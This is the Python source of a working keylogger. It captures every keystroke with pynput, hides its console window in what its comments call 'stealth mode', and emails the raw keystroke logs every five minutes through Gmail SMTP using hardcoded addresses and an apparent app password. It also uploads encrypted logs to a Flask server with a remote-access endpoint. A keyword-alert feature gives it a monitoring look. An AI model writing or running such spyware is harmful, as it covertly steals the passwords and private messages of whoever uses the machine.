import os
import time
import smtplib
import psutil
from cryptography.fernet import Fernet
from pynput import keyboard
from email.mime.text import MIMEText
from threading import Timer, Thread
import logging
from flask import Flask, request, jsonify
import requests
from datetime import datetime
import json
import tkinter as tk
from tkinter import messagebox

# Configuration
RAW_LOG_FILE = "keylogs_raw.txt"
ENCRYPTED_LOG_FILE = "keylogs_encrypted.txt"
KEYWORD_DATASET_FILE = "alert_keywords_dataset.json"  # Updated dataset file name
EMAIL_INTERVAL = 300  # Interval to send logs (in seconds)
TARGET_APPS = ["notepad.exe", "chrome.exe", "excel.exe", "word.exe","outlook.exe", "zoom.exe", "firefox.exe"]
SENDER_EMAIL = os.getenv("SENDER_EMAIL", "dhineshwaran92@gmail.com")
RECEIVER_EMAIL = os.getenv("RECEIVER_EMAIL", "dhineshwaranm01@gmail.com")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD", "pkop lvid bgca vtym")
KEY_FILE = "encryption.key"
LOG_FILE = "keylogger.log"
UPLOAD_URL = "http://localhost:5000/upload"
REMOTE_ACCESS_URL = "http://localhost:5000/remote_access"

# Logging setup
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Encryption Setup
def load_or_generate_key():
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, "rb") as key_file:
            return key_file.read()
    else:
        key = Fernet.generate_key()
        with open(KEY_FILE, "wb") as key_file:
            key_file.write(key)
        return key

cipher = Fernet(load_or_generate_key())

# Globals
typed_chars = []

# Ensure log files exist
def initialize_log_files():
    for file_name in [RAW_LOG_FILE, ENCRYPTED_LOG_FILE]:
        if not os.path.exists(file_name):
            open(file_name, "w").close()

# Ensure keyword dataset exists
def initialize_keyword_dataset():
    if not os.path.exists(KEYWORD_DATASET_FILE):
        with open(KEYWORD_DATASET_FILE, "w") as dataset_file:
            default_dataset = [
                {"keyword": "hack", "description": "Indicates potential hacking or unauthorized access attempt", "severity": "high"},
                {"keyword": "exploit", "description": "Reference to exploiting vulnerabilities in systems", "severity": "high"},
                {"keyword": "malware", "description": "Mentions of malicious software", "severity": "high"},
                {"keyword": "phish", "description": "Potential phishing attempt detected", "severity": "high"},
                {"keyword": "ransomware", "description": "Mentions of ransomware or related attacks", "severity": "high"},
                {"keyword": "spyware", "description": "Indicates spyware installation or activity", "severity": "high"},
                {"keyword": "trojan", "description": "Reference to Trojan malware", "severity": "high"},
                {"keyword": "keylogger", "description": "Mentions of keylogger software", "severity": "high"},
                {"keyword": "ddos", "description": "Distributed Denial of Service attack activity", "severity": "high"},
                {"keyword": "rootkit", "description": "Detection of rootkit-related terms", "severity": "high"},
                {"keyword": "payload", "description": "Potential reference to malware payload", "severity": "medium"},
                {"keyword": "backdoor", "description": "Possible backdoor access attempt", "severity": "high"},
                {"keyword": "botnet", "description": "Mentions of botnet activity or creation", "severity": "high"},
                {"keyword": "zero-day", "description": "Reference to zero-day vulnerabilities", "severity": "high"},
                {"keyword": "shell", "description": "Possible shell command execution or access", "severity": "medium"},
                {"keyword": "command-and-control", "description": "Indicates communication with a C&C server", "severity": "high"},
                {"keyword": "virus", "description": "Mentions of computer viruses", "severity": "high"},
                {"keyword": "scam", "description": "Potential scam-related keywords", "severity": "medium"},
                {"keyword": "breach", "description": "Possible data breach or unauthorized access", "severity": "high"},
                {"keyword": "sql injection", "description": "Reference to SQL injection attack methods", "severity": "high"},
                {"keyword": "xss", "description": "Cross-Site Scripting attack detection", "severity": "high"},
                {"keyword": "buffer overflow", "description": "Possible buffer overflow attack reference", "severity": "high"},
                {"keyword": "cryptojacking", "description": "Cryptocurrency mining malware activity", "severity": "high"},
                {"keyword": "password cracking", "description": "Indicates password cracking attempts", "severity": "high"},
                {"keyword": "privilege escalation", "description": "Possible privilege escalation activity", "severity": "high"}
            ]
            json.dump(default_dataset, dataset_file, indent=4)

# Load alert keywords
def load_alert_keywords():
    try:
        with open(KEYWORD_DATASET_FILE, "r") as dataset_file:
            return json.load(dataset_file)
    except Exception as e:
        logging.error(f"Failed to load keyword dataset: {e}")
        return []

ALERT_KEYWORDS = load_alert_keywords()

# Function to check if the target app is active
def is_target_app():
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] in TARGET_APPS:
            return True
    return False

# Function to send email
def send_email(subject, body):
    try:
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = SENDER_EMAIL
        msg['To'] = RECEIVER_EMAIL
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(SENDER_EMAIL, EMAIL_PASSWORD)
            server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, msg.as_string())
        logging.info("Email sent successfully!")
    except Exception as e:
        logging.error(f"Failed to send email: {e}")


# Function to show a pop-up alert
def show_popup_alert(keyword_info, timestamp):
    try:
        # Initialize Tkinter root
        root = tk.Tk()
        root.withdraw()  # Hide the main window
        message = (f"Keyword Alert Triggered!\n\n"
                   f"Keyword: {keyword_info['keyword']}\n"
                   f"Description: {keyword_info['description']}\n"
                   f"Severity: {keyword_info['severity']}\n"
                   f"Timestamp: {timestamp}")
        messagebox.showwarning("Alert Message", message)
        root.destroy()  # Close the Tkinter instance
    except Exception as e:
        logging.error(f"Failed to show pop-up alert: {e}")


# Function to send alerts when keywords are detected

def send_alert(keyword_info, timestamp):
    try:
        subject = "Keyword Alert!"
        body = (f"Keyword Alert Triggered!\n\n"
                f"Keyword: {keyword_info['keyword']}\n"
                f"Description: {keyword_info['description']}\n"
                f"Severity: {keyword_info['severity']}\n"
                f"Timestamp: {timestamp}\n"
                f"Target Application Active: {is_target_app()}\n")
        logging.info(f"Sending alert for keyword: {keyword_info['keyword']}")
        
        # Send email alert
        send_email(subject, body)
        
        # Show pop-up alert
        show_popup_alert(keyword_info, timestamp)
    except Exception as e:
        logging.error(f"Failed to send alert: {e}")



# Function to log keystrokes
def on_press(key):
    global typed_chars
    try:
        key_data = key.char
        typed_chars.append(key_data)
    except AttributeError:
        if key == keyboard.Key.space:
            typed_chars.append(" ")
        elif key == keyboard.Key.enter:
            typed_chars.append("\n")
        elif key == keyboard.Key.backspace and typed_chars:
            typed_chars.pop()

    typed_string = "".join(typed_chars)
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Write raw logs to RAW_LOG_FILE
    with open(RAW_LOG_FILE, "a") as raw_log_file:
        raw_log_file.write(f"[{timestamp}] {typed_string}\n")

    # Check for alert keywords
    for keyword_info in ALERT_KEYWORDS:
        if keyword_info['keyword'] in typed_string.lower():
            logging.info(f"Keyword detected: {keyword_info['keyword']}")
            send_alert(keyword_info, timestamp)
            typed_chars = []  # Reset after alert

    # Encrypt and log if target app is active
    if is_target_app():
        encrypted_data = cipher.encrypt(typed_string.encode())
        with open(ENCRYPTED_LOG_FILE, "ab") as enc_file:
            enc_file.write(encrypted_data + b"\n")

# Function to send logs periodically
def send_logs_periodically():
    global UPLOAD_URL
    try:
        if os.path.exists(RAW_LOG_FILE):
            with open(RAW_LOG_FILE, "r") as file:
                raw_logs = file.read()

            # Email logs
            subject = "Periodic Keylogger Logs"
            body = f"Here are the logged keystrokes (raw):\n\n{raw_logs}"
            send_email(subject, body)

            # Upload logs to the server
            if UPLOAD_URL:
                with open(ENCRYPTED_LOG_FILE, "rb") as enc_file:
                    response = requests.post(UPLOAD_URL, files={"file": enc_file})
                    if response.status_code == 200:
                        logging.info("Logs uploaded successfully!")
                    else:
                        logging.error(f"Failed to upload logs: {response.status_code}")

            # Clear raw log file after sending
            open(RAW_LOG_FILE, "w").close()
    except Exception as e:
        logging.error(f"Failed to send periodic logs: {e}")

    # Schedule the next log sending
    Timer(EMAIL_INTERVAL, send_logs_periodically).start()

# Function to enable remote data access
def enable_remote_data_access():
    try:
        response = requests.get(REMOTE_ACCESS_URL)
        if response.status_code == 200:
            logging.info("Remote data access enabled successfully.")
        else:
            logging.error(f"Failed to enable remote access: {response.status_code}")
    except Exception as e:
        logging.error(f"Error enabling remote access: {e}")

# Function to hide the console window (stealth mode)
def hide_window():
    try:
        import win32console, win32gui
        window = win32console.GetConsoleWindow()
        win32gui.ShowWindow(window, 0)
    except ImportError:
        logging.warning("Stealth mode is unavailable on this platform.")

# Flask Server for Log Uploads
def run_server():
    app = Flask(__name__)

    @app.route('/upload', methods=['POST'])
    def upload_logs():
        try:
            if 'file' not in request.files:
                return "No file part", 400
            file = request.files['file']
            if file.filename == '':
                return "No selected file", 400
            filepath = os.path.join("server_logs", file.filename)
            file.save(filepath)
            logging.info(f"File uploaded successfully: {filepath}")
            return "File uploaded successfully", 200
        except Exception as e:
            logging.error(f"File upload failed: {e}")
            return "Internal server error", 500

    @app.route('/remote_access', methods=['GET'])
    def remote_access():
        try:
            with open(RAW_LOG_FILE, "r") as raw_file:
                raw_data = raw_file.read()
            with open(ENCRYPTED_LOG_FILE, "rb") as enc_file:
                encrypted_data = enc_file.read()
            return jsonify({
                "raw_logs": raw_data,
                "encrypted_logs": encrypted_data.decode('latin1')
            }), 200
        except Exception as e:
            logging.error(f"Remote access failed: {e}")
            return "Internal server error", 500

    # Ensure server_logs directory exists
    os.makedirs("server_logs", exist_ok=True)

    # Run the server
    try:
        app.run(port=5000)
    except Exception as e:
        logging.error(f"Failed to start server: {e}")

# Main Function
def main():
    global UPLOAD_URL
    initialize_log_files()
    initialize_keyword_dataset()

    # Start the server in a separate thread
    server_thread = Thread(target=run_server)
    server_thread.daemon = True
    server_thread.start()

    # Assign the upload URL dynamically
    UPLOAD_URL = "http://localhost:5000/upload"

    hide_window()  # Activate stealth mode
    send_logs_periodically()
    enable_remote_data_access()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
